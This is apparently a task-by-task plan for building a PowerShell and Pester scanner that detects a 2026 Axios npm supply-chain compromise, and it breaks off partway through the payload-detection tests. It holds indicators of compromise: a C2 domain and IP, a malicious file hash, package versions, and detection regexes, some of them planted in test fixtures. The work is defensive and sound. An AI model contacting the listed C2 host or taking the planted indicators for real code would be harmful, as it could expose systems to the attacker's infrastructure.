# Axios NPM Compromise Scanner Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a PowerShell utility that gives a developer a defensible "clean bill of health" after the March 31, 2026 Axios NPM supply chain attack — or clearly identifies active compromise.

**Architecture:** Ten private functions orchestrated by a main entry-point script. Covers the full kill chain: lockfile evidence → deployed package artifacts → dropped RAT payloads → persistence mechanisms → XOR-obfuscated indicators → network evidence. Tested with Pester v5 using fixture directories.

**Tech Stack:** PowerShell 5.1+ / 7+, Pester v5, System.Security.Cryptography.SHA256, Get-ScheduledTask, Get-NetTCPConnection, ForEach-Object -Parallel (PS7) / sequential fallback (PS5.1), Send-MailMessage

**Design principle:** A clean result means ALL ten checks passed. Any single hit escalates to COMPROMISED.

---

## File Structure

```
NPM-Axios/
├── Invoke-AxiosCompromiseScanner.ps1
├── Private/
│   ├── Get-NodeProjects.ps1              # FR1: find package.json files
│   ├── Invoke-LockfileAnalysis.ps1       # FR2: npm + yarn + pnpm lockfiles
│   ├── Find-ForensicArtifacts.ps1        # FR3: plain-crypto-js dir + setup.js hash
│   ├── New-ScanReport.ps1                # FR4: full forensic report
│   ├── Send-ScanReport.ps1               # FR5: SMTP email
│   ├── Invoke-NpmCacheScan.ps1           # NEW: npm cache + global npm
│   ├── Search-DroppedPayloads.ps1        # NEW: RAT payloads in temp/appdata
│   ├── Find-PersistenceArtifacts.ps1     # NEW: scheduled tasks, registry, startup
│   ├── Search-XorEncodedC2.ps1          # NEW: XOR-decoded C2 indicators
│   ├── Get-NetworkEvidence.ps1          # NEW: DNS cache, netstat, firewall log
│   └── New-ExecBriefing.ps1            # NEW: C-Suite executive briefing document
└── Tests/
    ├── Fixtures/
    │   ├── CleanProject/
    │   │   └── package-lock.json
    │   ├── VulnerableNpmProject/
    │   │   ├── package-lock.json
    │   │   ├── malware-loader.js
    │   │   └── node_modules/plain-crypto-js/setup.js
    │   ├── VulnerableYarnProject/
    │   │   └── yarn.lock
    │   ├── VulnerablePnpmProject/
    │   │   └── pnpm-lock.yaml
    │   └── MalformedProject/
    │       └── package-lock.json
    ├── Get-NodeProjects.Tests.ps1
    ├── Invoke-LockfileAnalysis.Tests.ps1
    ├── Find-ForensicArtifacts.Tests.ps1
    ├── New-ScanReport.Tests.ps1
    ├── Send-ScanReport.Tests.ps1
    ├── Invoke-NpmCacheScan.Tests.ps1
    ├── Search-DroppedPayloads.Tests.ps1
    ├── Find-PersistenceArtifacts.Tests.ps1
    ├── Search-XorEncodedC2.Tests.ps1
    ├── Get-NetworkEvidence.Tests.ps1
    ├── New-ExecBriefing.Tests.ps1
    └── Invoke-AxiosCompromiseScanner.Tests.ps1
```

**Function Contracts:**

| Function | Parameters | Returns |
|---|---|---|
| `Get-NodeProjects` | `[string[]]$Path` | `PSCustomObject[]` → `ProjectPath`, `PackageJsonPath` |
| `Invoke-LockfileAnalysis` | `[string]$ProjectPath` | `PSCustomObject` → `ProjectPath`, `HasVulnerableAxios`, `VulnerableAxiosVersion`, `HasMaliciousPlainCrypto`, `LockfileType`, `LockfilePath`, `Error` |
| `Find-ForensicArtifacts` | `[string]$ProjectPath` | `PSCustomObject[]` → `Type`, `Path`, `Hash`, `Severity`, `Description` |
| `Invoke-NpmCacheScan` | _(none)_ | `PSCustomObject[]` → `Type`, `Path`, `PackageName`, `Version`, `Severity`, `Description` |
| `Search-DroppedPayloads` | `[datetime]$AttackWindowStart` | `PSCustomObject[]` → `Type`, `Path`, `Hash`, `CreationTime`, `Severity`, `Description` |
| `Find-PersistenceArtifacts` | _(none)_ | `PSCustomObject[]` → `Type`, `Location`, `Name`, `Value`, `Severity`, `Description` |
| `Search-XorEncodedC2` | `[string[]]$SearchPaths` | `PSCustomObject[]` → `Type`, `Path`, `DecodedIndicator`, `Severity`, `Description` |
| `Get-NetworkEvidence` | _(none)_ | `PSCustomObject[]` → `Type`, `Detail`, `Severity`, `Description` |
| `New-ScanReport` | `[PSCustomObject[]]$Projects`, `[PSCustomObject[]]$LockfileResults`, `[PSCustomObject[]]$Artifacts`, `[PSCustomObject[]]$CacheFindings`, `[PSCustomObject[]]$DroppedPayloads`, `[PSCustomObject[]]$PersistenceArtifacts`, `[PSCustomObject[]]$XorFindings`, `[PSCustomObject[]]$NetworkEvidence`, `[string]$OutputPath`, `[hashtable]$ScanMetadata` | `[string]` report path |
| `New-ExecBriefing` | `[int]$ProjectCount`, `[PSCustomObject[]]$LockfileResults`, `[PSCustomObject[]]$Artifacts`, `[PSCustomObject[]]$CacheFindings`, `[PSCustomObject[]]$DroppedPayloads`, `[PSCustomObject[]]$PersistenceArtifacts`, `[PSCustomObject[]]$XorFindings`, `[PSCustomObject[]]$NetworkEvidence`, `[string]$TechnicalReportPath`, `[string]$OutputPath`, `[hashtable]$ScanMetadata` | `[string]` briefing path |
| `Send-ScanReport` | `[string[]]$ReportPaths`, `[string]$SMTPServer`, `[int]$SMTPPort`, `[string]$FromAddress`, `[string[]]$ToAddress`, `[PSCredential]$Credential`, `[bool]$UseTLS` | `[bool]` success |

**Attack window constant used throughout:** `2026-03-31T00:21:00Z`

---

## Task 1: Project Scaffold and Test Fixtures

**Files:**
- Create: `Tests/Fixtures/CleanProject/package-lock.json`
- Create: `Tests/Fixtures/VulnerableNpmProject/package-lock.json`
- Create: `Tests/Fixtures/VulnerableNpmProject/malware-loader.js`
- Create: `Tests/Fixtures/VulnerableNpmProject/node_modules/plain-crypto-js/setup.js`
- Create: `Tests/Fixtures/VulnerableYarnProject/yarn.lock`
- Create: `Tests/Fixtures/VulnerablePnpmProject/pnpm-lock.yaml`
- Create: `Tests/Fixtures/MalformedProject/package-lock.json`

- [ ] **Step 1: Create directory structure**

```bash
mkdir -p Tests/Fixtures/CleanProject
mkdir -p Tests/Fixtures/VulnerableNpmProject/node_modules/plain-crypto-js
mkdir -p Tests/Fixtures/VulnerableYarnProject
mkdir -p Tests/Fixtures/VulnerablePnpmProject
mkdir -p Tests/Fixtures/MalformedProject
mkdir -p Private
```

- [ ] **Step 2: Create clean project fixture**

`Tests/Fixtures/CleanProject/package-lock.json`:
```json
{
  "name": "clean-project",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "packages": {
    "": { "name": "clean-project", "version": "1.0.0", "dependencies": { "axios": "^1.14.0" } },
    "node_modules/axios": { "version": "1.14.0" }
  }
}
```

- [ ] **Step 3: Create vulnerable NPM project fixture**

`Tests/Fixtures/VulnerableNpmProject/package-lock.json`:
```json
{
  "name": "vulnerable-npm-project",
  "version": "1.0.0",
  "lockfileVersion": 2,
  "packages": {
    "": { "name": "vulnerable-npm-project", "version": "1.0.0", "dependencies": { "axios": "^1.14.1" } },
    "node_modules/axios": { "version": "1.14.1" },
    "node_modules/plain-crypto-js": { "version": "4.2.1" }
  }
}
```

- [ ] **Step 4: Create C2 indicator fixture**

`Tests/Fixtures/VulnerableNpmProject/malware-loader.js`:
```javascript
// postinstall hook
const host = 'sfrclak.com';
```

- [ ] **Step 5: Create dummy setup.js**

`Tests/Fixtures/VulnerableNpmProject/node_modules/plain-crypto-js/setup.js`:
```javascript
// TEST FIXTURE - simulates malicious postinstall script
module.exports = {};
```

- [ ] **Step 6: Create vulnerable Yarn fixture**

`Tests/Fixtures/VulnerableYarnProject/yarn.lock`:
```
# yarn lockfile v1

axios@^0.30.0:
  version "0.30.4"
  resolved "https://registry.yarnpkg.com/axios/-/axios-0.30.4.tgz"
  integrity sha512-FAKE==

plain-crypto-js@^4.2.0:
  version "4.2.1"
  resolved "https://registry.yarnpkg.com/plain-crypto-js/-/plain-crypto-js-4.2.1.tgz"
  integrity sha512-FAKE2==
```

- [ ] **Step 7: Create vulnerable pnpm fixture**

`Tests/Fixtures/VulnerablePnpmProject/pnpm-lock.yaml`:
```yaml
lockfileVersion: '6.0'

packages:

  /axios/1.14.1:
    resolution: {integrity: sha512-FAKE==}
    dev: false

  /plain-crypto-js/4.2.1:
    resolution: {integrity: sha512-FAKE2==}
    dev: false
```

- [ ] **Step 8: Create malformed fixture**

`Tests/Fixtures/MalformedProject/package-lock.json`:
```
{ this is not valid JSON ][
```

- [ ] **Step 9: Verify Pester v5 installed**

```powershell
pwsh -Command "
\$p = Get-Module -ListAvailable Pester | Sort-Object Version -Descending | Select-Object -First 1
if (-not \$p -or \$p.Version.Major -lt 5) { Install-Module Pester -Force -SkipPublisherCheck -Scope CurrentUser }
Get-Module -ListAvailable Pester | Select-Object Name, Version
"
```

Expected: `Pester  5.x.x`

- [ ] **Step 10: Commit**

```bash
git init && git add Tests/
git commit -m "chore: add test fixtures"
```

---

## Task 2: Get-NodeProjects — Disk Scanning (FR1)

**Files:**
- Create: `Tests/Get-NodeProjects.Tests.ps1`
- Create: `Private/Get-NodeProjects.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/Get-NodeProjects.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/Get-NodeProjects.ps1"
    $fixtureRoot = "$PSScriptRoot/Fixtures"
}

Describe 'Get-NodeProjects' {
    Context 'path with Node.js projects' {
        It 'finds one result per package.json' {
            (Get-NodeProjects -Path $fixtureRoot).Count | Should -BeGreaterOrEqual 3
        }
        It 'returns ProjectPath and PackageJsonPath' {
            $r = (Get-NodeProjects -Path $fixtureRoot)[0]
            $r.ProjectPath     | Should -Not -BeNullOrEmpty
            $r.PackageJsonPath | Should -Not -BeNullOrEmpty
        }
        It 'PackageJsonPath filename is package.json' {
            Get-NodeProjects -Path $fixtureRoot | ForEach-Object {
                [System.IO.Path]::GetFileName($_.PackageJsonPath) | Should -Be 'package.json'
            }
        }
        It 'excludes package.json inside node_modules' {
            $tmp = "$fixtureRoot/VulnerableNpmProject/node_modules/plain-crypto-js/package.json"
            '{"name":"plain-crypto-js"}' | Set-Content $tmp
            try {
                Get-NodeProjects -Path "$fixtureRoot/VulnerableNpmProject" | ForEach-Object {
                    $_.PackageJsonPath | Should -Not -Match 'node_modules'
                }
            } finally { Remove-Item $tmp -ErrorAction SilentlyContinue }
        }
    }
    Context 'nonexistent path' {
        It 'returns empty without throwing' {
            { Get-NodeProjects -Path 'C:\DoesNotExist\Fake' } | Should -Not -Throw
            Get-NodeProjects -Path 'C:\DoesNotExist\Fake' | Should -BeNullOrEmpty
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Get-NodeProjects.Tests.ps1 -Output Detailed"
```

Expected: FAILED — `Get-NodeProjects` not defined

- [ ] **Step 3: Implement**

`Private/Get-NodeProjects.ps1`:
```powershell
function Get-NodeProjects {
    [CmdletBinding()]
    param(
        [string[]]$Path = @('C:\Users', 'C:\Dev', 'C:\Projects')
    )
    $results = [System.Collections.Generic.List[PSCustomObject]]::new()
    foreach ($rootPath in $Path) {
        if (-not (Test-Path $rootPath)) { Write-Warning "Path not found, skipping: $rootPath"; continue }
        try {
            Get-ChildItem -Path $rootPath -Recurse -Filter 'package.json' -ErrorAction SilentlyContinue -Force |
            Where-Object { $_.FullName -notmatch [regex]::Escape([IO.Path]::DirectorySeparatorChar + 'node_modules' + [IO.Path]::DirectorySeparatorChar) -and $_.FullName -notmatch '/node_modules/' } |
            ForEach-Object { $results.Add([PSCustomObject]@{ ProjectPath = $_.DirectoryName; PackageJsonPath = $_.FullName }) }
        } catch { Write-Warning "Error scanning ${rootPath}: $_" }
    }
    return @($results)
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/Get-NodeProjects.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/Get-NodeProjects.ps1 Tests/Get-NodeProjects.Tests.ps1
git commit -m "feat: add Get-NodeProjects disk scanner (FR1)"
```

---

## Task 3: Invoke-LockfileAnalysis — npm + yarn + pnpm (FR2)

**Files:**
- Create: `Tests/Invoke-LockfileAnalysis.Tests.ps1`
- Create: `Private/Invoke-LockfileAnalysis.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/Invoke-LockfileAnalysis.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/Invoke-LockfileAnalysis.ps1"
    $fix = "$PSScriptRoot/Fixtures"
}

Describe 'Invoke-LockfileAnalysis' {
    Context 'clean npm (axios@1.14.0)' {
        BeforeAll { $r = Invoke-LockfileAnalysis -ProjectPath "$fix/CleanProject" }
        It 'HasVulnerableAxios = false'      { $r.HasVulnerableAxios      | Should -BeFalse }
        It 'HasMaliciousPlainCrypto = false' { $r.HasMaliciousPlainCrypto | Should -BeFalse }
        It 'LockfileType = npm'              { $r.LockfileType            | Should -Be 'npm' }
        It 'no Error'                        { $r.Error                   | Should -BeNullOrEmpty }
    }
    Context 'vulnerable npm (axios@1.14.1)' {
        BeforeAll { $r = Invoke-LockfileAnalysis -ProjectPath "$fix/VulnerableNpmProject" }
        It 'HasVulnerableAxios = true'             { $r.HasVulnerableAxios      | Should -BeTrue }
        It 'VulnerableAxiosVersion = 1.14.1'       { $r.VulnerableAxiosVersion  | Should -Be '1.14.1' }
        It 'HasMaliciousPlainCrypto = true'        { $r.HasMaliciousPlainCrypto | Should -BeTrue }
    }
    Context 'vulnerable yarn (axios@0.30.4)' {
        BeforeAll { $r = Invoke-LockfileAnalysis -ProjectPath "$fix/VulnerableYarnProject" }
        It 'HasVulnerableAxios = true'       { $r.HasVulnerableAxios     | Should -BeTrue }
        It 'VulnerableAxiosVersion = 0.30.4' { $r.VulnerableAxiosVersion | Should -Be '0.30.4' }
        It 'HasMaliciousPlainCrypto = true'  { $r.HasMaliciousPlainCrypto | Should -BeTrue }
        It 'LockfileType = yarn'             { $r.LockfileType           | Should -Be 'yarn' }
    }
    Context 'vulnerable pnpm (axios@1.14.1)' {
        BeforeAll { $r = Invoke-LockfileAnalysis -ProjectPath "$fix/VulnerablePnpmProject" }
        It 'HasVulnerableAxios = true'      { $r.HasVulnerableAxios      | Should -BeTrue }
        It 'VulnerableAxiosVersion = 1.14.1' { $r.VulnerableAxiosVersion | Should -Be '1.14.1' }
        It 'HasMaliciousPlainCrypto = true' { $r.HasMaliciousPlainCrypto | Should -BeTrue }
        It 'LockfileType = pnpm'            { $r.LockfileType            | Should -Be 'pnpm' }
    }
    Context 'malformed JSON' {
        It 'does not throw'           { { Invoke-LockfileAnalysis -ProjectPath "$fix/MalformedProject" } | Should -Not -Throw }
        It 'returns an Error message' { (Invoke-LockfileAnalysis -ProjectPath "$fix/MalformedProject").Error | Should -Not -BeNullOrEmpty }
    }
    Context 'no lockfile' {
        It 'returns LockfileType null and HasVulnerableAxios false' {
            $r = Invoke-LockfileAnalysis -ProjectPath $TestDrive
            $r.LockfileType       | Should -BeNullOrEmpty
            $r.HasVulnerableAxios | Should -BeFalse
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Invoke-LockfileAnalysis.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement**

`Private/Invoke-LockfileAnalysis.ps1`:
```powershell
function Invoke-LockfileAnalysis {
    [CmdletBinding()]
    param([Parameter(Mandatory)][string]$ProjectPath)

    $vulnAxios   = @('1.14.1', '0.30.4')
    $vulnCrypto  = '4.2.1'
    $result = [PSCustomObject]@{
        ProjectPath             = $ProjectPath
        HasVulnerableAxios      = $false
        VulnerableAxiosVersion  = $null
        HasMaliciousPlainCrypto = $false
        LockfileType            = $null
        LockfilePath            = $null
        Error                   = $null
    }

    $pkgLock  = Join-Path $ProjectPath 'package-lock.json'
    $yarnLock = Join-Path $ProjectPath 'yarn.lock'
    $pnpmLock = Join-Path $ProjectPath 'pnpm-lock.yaml'

    if (Test-Path $pkgLock) {
        $result.LockfileType = 'npm'; $result.LockfilePath = $pkgLock
        try {
            $lock = Get-Content $pkgLock -Raw | ConvertFrom-Json -ErrorAction Stop
            $props = if ($lock.packages) { $lock.packages.PSObject.Properties }
                     elseif ($lock.dependencies) { $lock.dependencies.PSObject.Properties }
                     else { @() }
            foreach ($p in $props) {
                $name = $p.Name -replace '^node_modules/', ''
                $ver  = $p.Value.version
                if ($name -eq 'axios' -and $ver -in $vulnAxios) { $result.HasVulnerableAxios = $true; $result.VulnerableAxiosVersion = $ver }
                if ($name -eq 'plain-crypto-js' -and $ver -eq $vulnCrypto) { $result.HasMaliciousPlainCrypto = $true }
            }
        } catch { $result.Error = "Failed to parse package-lock.json: $_" }

    } elseif (Test-Path $yarnLock) {
        $result.LockfileType = 'yarn'; $result.LockfilePath = $yarnLock
        try {
            $content = Get-Content $yarnLock -Raw -ErrorAction Stop
            foreach ($m in [regex]::Matches($content, '(?m)^axios@[^\n]+\n\s+version\s+"([^"]+)"')) {
                if ($m.Groups[1].Value -in $vulnAxios) { $result.HasVulnerableAxios = $true; $result.VulnerableAxiosVersion = $m.Groups[1].Value }
            }
            foreach ($m in [regex]::Matches($content, '(?m)^plain-crypto-js@[^\n]+\n\s+version\s+"([^"]+)"')) {
                if ($m.Groups[1].Value -eq $vulnCrypto) { $result.HasMaliciousPlainCrypto = $true }
            }
        } catch { $result.Error = "Failed to parse yarn.lock: $_" }

    } elseif (Test-Path $pnpmLock) {
        $result.LockfileType = 'pnpm'; $result.LockfilePath = $pnpmLock
        try {
            $content = Get-Content $pnpmLock -Raw -ErrorAction Stop
            # pnpm-lock.yaml format: "  /axios/1.14.1:" or "  axios@1.14.1:"
            foreach ($m in [regex]::Matches($content, '(?m)^\s+(?:/|)axios[/@]([^\s:]+):')) {
                if ($m.Groups[1].Value -in $vulnAxios) { $result.HasVulnerableAxios = $true; $result.VulnerableAxiosVersion = $m.Groups[1].Value }
            }
            foreach ($m in [regex]::Matches($content, '(?m)^\s+(?:/|)plain-crypto-js[/@]([^\s:]+):')) {
                if ($m.Groups[1].Value -eq $vulnCrypto) { $result.HasMaliciousPlainCrypto = $true }
            }
        } catch { $result.Error = "Failed to parse pnpm-lock.yaml: $_" }
    }

    return $result
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/Invoke-LockfileAnalysis.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/Invoke-LockfileAnalysis.ps1 Tests/Invoke-LockfileAnalysis.Tests.ps1
git commit -m "feat: add Invoke-LockfileAnalysis (npm+yarn+pnpm) (FR2)"
```

---

## Task 4: Find-ForensicArtifacts — package-level IOCs (FR3)

**Files:**
- Create: `Tests/Find-ForensicArtifacts.Tests.ps1`
- Create: `Private/Find-ForensicArtifacts.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/Find-ForensicArtifacts.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/Find-ForensicArtifacts.ps1"
    $fix = "$PSScriptRoot/Fixtures"
}

Describe 'Find-ForensicArtifacts' {
    Context 'clean project' {
        It 'returns empty' { Find-ForensicArtifacts -ProjectPath "$fix/CleanProject" | Should -BeNullOrEmpty }
    }
    Context 'vulnerable npm project' {
        BeforeAll { $results = Find-ForensicArtifacts -ProjectPath "$fix/VulnerableNpmProject" }
        It 'detects plain-crypto-js dir as MaliciousPackage Critical' {
            $r = $results | Where-Object Type -eq 'MaliciousPackage'
            $r          | Should -Not -BeNullOrEmpty
            $r.Severity | Should -Be 'Critical'
        }
        It 'detects setup.js as MaliciousScript with a hash' {
            $r = $results | Where-Object Type -eq 'MaliciousScript'
            $r      | Should -Not -BeNullOrEmpty
            $r.Hash | Should -Not -BeNullOrEmpty
        }
        It 'detects sfrclak.com as C2Indicator Critical' {
            $r = $results | Where-Object Type -eq 'C2Indicator'
            $r                | Should -Not -BeNullOrEmpty
            $r.Severity       | Should -Be 'Critical'
            $r.Description    | Should -Match 'sfrclak\.com'
        }
    }
    Context 'setup.js matching known malicious hash' {
        It 'sets severity Critical and description contains hash match' {
            . "$PSScriptRoot/../Private/Find-ForensicArtifacts.ps1"
            Mock Get-FileHash { [PSCustomObject]@{ Hash = 'E10B1FA84F1D6481625F741B69892780140D4E0E7769E7491E5F4D894C2E0E09' } }
            $r = (Find-ForensicArtifacts -ProjectPath "$fix/VulnerableNpmProject") | Where-Object Type -eq 'MaliciousScript'
            $r.Severity    | Should -Be 'Critical'
            $r.Description | Should -Match 'hash match'
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Find-ForensicArtifacts.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement**

`Private/Find-ForensicArtifacts.ps1`:
```powershell
function Find-ForensicArtifacts {
    [CmdletBinding()]
    param([Parameter(Mandatory)][string]$ProjectPath)

    $knownHash  = 'e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09'
    $c2Patterns = @('sfrclak.com', '142.11.206.73')
    $artifacts  = [System.Collections.Generic.List[PSCustomObject]]::new()
    $sep        = [IO.Path]::DirectorySeparatorChar

    $cryptoDir = @("${ProjectPath}${sep}node_modules${sep}plain-crypto-js", "$ProjectPath/node_modules/plain-crypto-js") |
                 Where-Object { Test-Path $_ } | Select-Object -First 1

    if ($cryptoDir) {
        $artifacts.Add([PSCustomObject]@{ Type='MaliciousPackage'; Path=$cryptoDir; Hash=$null; Severity='Critical'; Description='Malicious plain-crypto-js package in node_modules' })

        $setupJs = Join-Path $cryptoDir 'setup.js'
        if (Test-Path $setupJs) {
            try {
                $hash    = (Get-FileHash -Path $setupJs -Algorithm SHA256).Hash.ToLower()
                $isKnown = $hash -eq $knownHash
                $artifacts.Add([PSCustomObject]@{
                    Type        = 'MaliciousScript'
                    Path        = $setupJs
                    Hash        = $hash
                    Severity    = if ($isKnown) { 'Critical' } else { 'High' }
                    Description = if ($isKnown) { 'Known malicious setup.js (hash match)' } else { 'Suspicious setup.js in plain-crypto-js (hash mismatch — possible variant)' }
                })
            } catch { Write-Warning "Cannot hash ${setupJs}: $_" }
        }
    }

    try {
        Get-ChildItem -Path $ProjectPath -Filter '*.js' -Recurse -ErrorAction SilentlyContinue |
        Where-Object { $_.FullName -notmatch 'node_modules' -or $_.FullName -match "node_modules[/\\]plain-crypto-js[/\\]" } |
        Select-Object -First 1000 |
        ForEach-Object {
            try {
                $content = Get-Content $_.FullName -Raw -ErrorAction Stop
                foreach ($pat in $c2Patterns) {
                    if ($content -match [regex]::Escape($pat)) {
                        $artifacts.Add([PSCustomObject]@{ Type='C2Indicator'; Path=$_.FullName; Hash=$null; Severity='Critical'; Description="C2 indicator '$pat' found in file" })
                        break
                    }
                }
            } catch { }
        }
    } catch { Write-Warning "C2 scan error in ${ProjectPath}: $_" }

    return @($artifacts)
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/Find-ForensicArtifacts.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/Find-ForensicArtifacts.ps1 Tests/Find-ForensicArtifacts.Tests.ps1
git commit -m "feat: add Find-ForensicArtifacts IOC detector (FR3)"
```

---

## Task 5: Invoke-NpmCacheScan — npm Cache and Global npm

**Why this matters:** Even if a developer deleted `node_modules` and upgraded axios, the malicious package remains in the npm content-addressable cache. A clean `node_modules` scan paired with a poisoned cache means the next `npm install` can re-deploy the dropper.

**Files:**
- Create: `Tests/Invoke-NpmCacheScan.Tests.ps1`
- Create: `Private/Invoke-NpmCacheScan.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/Invoke-NpmCacheScan.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/Invoke-NpmCacheScan.ps1"
}

Describe 'Invoke-NpmCacheScan' {
    Context 'npm not installed' {
        BeforeAll { Mock Get-Command { $null } -ParameterFilter { $Name -eq 'npm' } }
        It 'returns empty without throwing' {
            { Invoke-NpmCacheScan } | Should -Not -Throw
            Invoke-NpmCacheScan    | Should -BeNullOrEmpty
        }
    }

    Context 'malicious package in npm cache index' {
        BeforeAll {
            # Simulate a cache index directory with a file referencing plain-crypto-js@4.2.1
            $fakeCacheDir = Join-Path $TestDrive 'npm-cache'
            $indexDir     = Join-Path $fakeCacheDir '_cacache/index-v5/ab/cd'
            $null = New-Item -ItemType Directory -Path $indexDir -Force
            # npm cache index entries are newline-delimited JSON; write a fake one
            $entry = '{"key":"make-fetch-happen:request-cache:https://registry.npmjs.org/plain-crypto-js/-/plain-crypto-js-4.2.1.tgz","integrity":"sha512-FAKE","time":1743379261000}'
            $entry | Set-Content (Join-Path $indexDir 'fakeentry')

            Mock Invoke-Expression { return $fakeCacheDir } -ParameterFilter { $Command -match 'npm config get cache' }
            Mock Get-Command { [PSCustomObject]@{ Name = 'npm' } } -ParameterFilter { $Name -eq 'npm' }
        }
        It 'returns a finding of type NpmCacheHit' {
            $results = Invoke-NpmCacheScan
            ($results | Where-Object Type -eq 'NpmCacheHit') | Should -Not -BeNullOrEmpty
        }
        It 'finding severity is High' {
            ($results | Where-Object Type -eq 'NpmCacheHit').Severity | Should -Be 'High'
        }
    }

    Context 'malicious package installed globally' {
        BeforeAll {
            $fakeGlobal = Join-Path $TestDrive 'global-npm'
            $null = New-Item -ItemType Directory -Path (Join-Path $fakeGlobal 'plain-crypto-js') -Force

            Mock Invoke-Expression { return $fakeGlobal } -ParameterFilter { $Command -match 'npm root -g' }
            Mock Get-Command { [PSCustomObject]@{ Name = 'npm' } } -ParameterFilter { $Name -eq 'npm' }
            Mock Invoke-Expression { return '' } -ParameterFilter { $Command -match 'npm config get cache' }
        }
        It 'returns a finding of type GlobalNpmHit' {
            $results = Invoke-NpmCacheScan
            ($results | Where-Object Type -eq 'GlobalNpmHit') | Should -Not -BeNullOrEmpty
        }
        It 'finding severity is Critical' {
            ($results | Where-Object Type -eq 'GlobalNpmHit').Severity | Should -Be 'Critical'
        }
    }
}
```

- [ ] **Step 2: Run — verify FAIL**

```powershell
pwsh -Command "Invoke-Pester Tests/Invoke-NpmCacheScan.Tests.ps1 -Output Detailed"
```

- [ ] **Step 3: Implement**

`Private/Invoke-NpmCacheScan.ps1`:
```powershell
function Invoke-NpmCacheScan {
    [CmdletBinding()]
    param()

    $findings = [System.Collections.Generic.List[PSCustomObject]]::new()

    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
        Write-Verbose 'npm not found — skipping cache scan'
        return @($findings)
    }

    $maliciousPkgs = @('plain-crypto-js', 'axios')
    $vulnVersions  = @('4.2.1', '1.14.1', '0.30.4')

    # ── npm content-addressable cache ──────────────────────────────────────────
    try {
        $cacheDir = (Invoke-Expression 'npm config get cache' 2>$null).Trim()
        $indexDir = Join-Path $cacheDir '_cacache/index-v5'

        if (Test-Path $indexDir) {
            Get-ChildItem -Path $indexDir -Recurse -File -ErrorAction SilentlyContinue |
            Select-Object -First 5000 |
            ForEach-Object {
                try {
                    $raw = Get-Content $_.FullName -Raw -ErrorAction Stop
                    foreach ($pkg in $maliciousPkgs) {
                        foreach ($ver in $vulnVersions) {
                            if ($raw -match "$pkg/-/$pkg-$ver\.tgz") {
                                $findings.Add([PSCustomObject]@{
                                    Type        = 'NpmCacheHit'
                                    Path        = $_.FullName
                                    PackageName = $pkg
                                    Version     = $ver
                                    Severity    = 'High'
                                    Description = "Malicious ${pkg}@${ver} found in npm cache index — run: npm cache clean --force"
                                })
                            }
                        }
                    }
                } catch { }
            }
        }
    } catch { Write-Warning "npm cache scan failed: $_" }

    # ── Global npm node_modules ────────────────────────────────────────────────
    try {
        $globalRoot = (Invoke-Expression 'npm root -g' 2>$null).Trim()
        if ($globalRoot -and (Test-Path $globalRoot)) {
            foreach ($pkg in $maliciousPkgs) {
                $globalPkgDir = Join-Path $globalRoot $pkg
                if (Test-Path $globalPkgDir) {
                    # Read version from package.json if present
                    $pkgJson = Join-Path $globalPkgDir 'package.json'
                    $ver = $null
                    if (Test-Path $pkgJson) {
                        try { $ver = (Get-Content $pkgJson -Raw | ConvertFrom-Json).version } catch { }
                    }
                    $isMalicious = (-not $ver) -or ($ver -in $vulnVersions)
                    if ($isMalicious) {
                        $findings.Add([PSCustomObject]@{
                            Type        = 'GlobalNpmHit'
                            Path        = $globalPkgDir
                            PackageName = $pkg
                            Version     = $ver ?? 'unknown'
                            Severity    = 'Critical'
                            Description = "Malicious ${pkg} found in global npm — run: npm uninstall -g $pkg"
                        })
                    }
                }
            }
        }
    } catch { Write-Warning "Global npm scan failed: $_" }

    return @($findings)
}
```

- [ ] **Step 4: Run — verify PASS**

```powershell
pwsh -Command "Invoke-Pester Tests/Invoke-NpmCacheScan.Tests.ps1 -Output Detailed"
```

- [ ] **Step 5: Commit**

```bash
git add Private/Invoke-NpmCacheScan.ps1 Tests/Invoke-NpmCacheScan.Tests.ps1
git commit -m "feat: add Invoke-NpmCacheScan for npm cache and global npm"
```

---

## Task 6: Search-DroppedPayloads — RAT Payload Detection

**Why this matters:** The dropper executed at `npm install` time. It downloaded a platform-specific binary and wrote it to disk — likely in `%TEMP%` or `%APPDATA%`. Even if the project is cleaned, the payload persists. This is the most direct evidence of active compromise.

**Files:**
- Create: `Tests/Search-DroppedPayloads.Tests.ps1`
- Create: `Private/Search-DroppedPayloads.ps1`

- [ ] **Step 1: Write failing tests**

`Tests/Search-DroppedPayloads.Tests.ps1`:
```powershell
BeforeAll {
    . "$PSScriptRoot/../Private/Search-DroppedPayloads.ps1"
    $attackStart = [datetime]::Parse('2026-03-31T00:21:00Z').ToLocalTime()
}

Describe 'Search-DroppedPayloads' {
    Context 'no suspicious files in scan paths' {
        BeforeAll {
            $cleanDir = Join-Path $TestDrive 'clean-temp'
            $null = New-Item -ItemType Directory -Path $cleanDir -Force
